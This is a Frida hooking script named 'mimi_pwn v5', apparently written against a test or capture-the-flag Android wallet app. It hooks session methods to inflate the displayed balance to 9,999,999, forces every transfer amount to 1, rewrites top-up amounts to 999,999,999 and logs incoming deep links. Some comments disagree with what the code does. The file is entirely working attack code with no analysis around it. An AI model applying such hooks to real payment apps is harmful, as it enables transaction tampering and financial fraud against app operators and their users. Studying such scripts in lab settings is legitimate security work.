Java.perform(function () {
    console.log("=== mimi_pwn v5 ===");

    // 1. BOOST SessionManager.saveSession (for fresh login)
    try {
        var SM = Java.use("com.example.mimi.SessionManager");
        var saveSession = SM.saveSession.overload("java.lang.String", "java.lang.String", "com.example.mimi.User");
        SM.saveSession.implementation = function (accessToken, refreshToken, user) {
            console.log("[BOOST_SAVE] Balance: " + user.getBalance() + " -> 9,999,999");
            user.setBalance(9999999.0);
            return saveSession.call(this, accessToken, refreshToken, user);
        };
        console.log("[BOOST_SAVE] OK");
    } catch(e) { console.log("[BOOST_SAVE] FAIL " + e); }

    // 2. BOOST SessionManager.getCurrentUser (for returning user)
    try {
        var SM = Java.use("com.example.mimi.SessionManager");
        var getCU = SM.getCurrentUser.overload();
        SM.getCurrentUser.implementation = function () {
            var user = getCU.call(this);
            if (user != null) {
                console.log("[BOOST_GET] Balance: " + user.getBalance() + " -> 9,999,999");
                user.setBalance(9999999.0);
            }
            return user;
        };
        console.log("[BOOST_GET] OK");
    } catch(e) { console.log("[BOOST_GET] FAIL " + e); }

    // 3. BYPASS TransferRepository.executeTransfer -> amount = 0
    try {
        var TR = Java.use("com.example.mimi.TransferRepository");
        var execTransfer = TR.executeTransfer.overload("java.lang.String", "long", "java.lang.String", "com.example.mimi.TransferCallback");
        TR.executeTransfer.implementation = function (phone, amount, note, callback) {
            console.log("[TRANSFER] phone=" + phone + " amount=" + amount + " -> 1");
            return execTransfer.call(this, phone, 1, note, callback);
        };
        console.log("[BYPASS] OK");
    } catch(e) { console.log("[BYPASS] FAIL " + e); }

    // 4. TOPUP WalletViewModel.topUp -> 9,999,999
    try {
        var WVM = Java.use("com.example.mimi.WalletViewModel");
        var topUp = WVM.topUp.overload("long");
        WVM.topUp.implementation = function (amount) {
            console.log("[TOPUP] amount=" + amount + " -> 9,999,999");
            return topUp.call(this, 999999999);
        };
        console.log("[TOPUP] OK");
    } catch(e) { console.log("[TOPUP] FAIL " + e); }

    // 5. DEEPLINK logging
    try {
        var CRA = Java.use("com.example.mimi.CentralRouterActivity");
        CRA.onCreate.overload("android.os.Bundle").implementation = function (bundle) {
            var d = this.getIntent().getData();
            if (d) console.log("[DEEPLINK] " + d.toString());
            this.onCreate(bundle);
        };
        console.log("[DEEPLINK] OK");
    } catch(e) { console.log("[DEEPLINK] FAIL " + e); }

    console.log("[COMBO] READY");
});
